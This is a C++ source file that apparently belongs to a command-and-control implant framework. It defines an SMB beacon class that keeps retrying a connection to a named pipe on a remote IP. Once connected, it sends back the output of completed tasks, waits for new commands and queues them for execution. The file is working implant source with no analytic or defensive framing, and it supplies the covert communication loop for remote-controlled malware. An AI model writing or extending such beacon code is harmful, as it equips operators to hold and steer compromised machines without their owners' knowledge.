#include "BeaconSmb.hpp"
#include <PipeHandler.hpp>

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(std::string& config, const std::string& ip, const std::string& pipeName)
    : Beacon()
{
    // beacon and modules config
    initConfig(config);

    m_clientSmb = new PipeHandler::Client(ip, pipeName);
}


BeaconSmb::~BeaconSmb()
{
    delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
    SPDLOG_DEBUG("initConnection");
    while(!m_clientSmb->initConnection())
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(333));    
        SPDLOG_DEBUG("initConnection");
    }

    std::string output;
    taskResultsToCmd(output);

    SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));

    bool res = m_clientSmb->sendData(output);
    if(res)
    {
        string input;
        while(input.empty())
        {
            res=m_clientSmb->receiveData(input);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));        
        }
        if(res)
        {
            SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));

            if(!input.empty())
            {
                cmdToTasks(input);
            }
        }
        else
        {
            SPDLOG_DEBUG("Receive failed");
        }
    }
    else
        SPDLOG_DEBUG("Send failed");    


    m_clientSmb->closeConnection();
}

